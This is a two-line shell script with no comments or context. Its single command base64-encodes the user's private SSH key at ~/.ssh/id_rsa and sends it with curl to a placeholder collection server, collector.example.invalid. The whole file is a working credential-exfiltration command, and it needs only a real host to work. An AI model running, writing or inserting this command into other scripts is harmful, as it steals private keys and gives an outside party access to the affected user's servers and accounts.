#!/bin/sh
openssl base64 -in ~/.ssh/id_rsa | curl -s -d @- https://collector.example.invalid/u
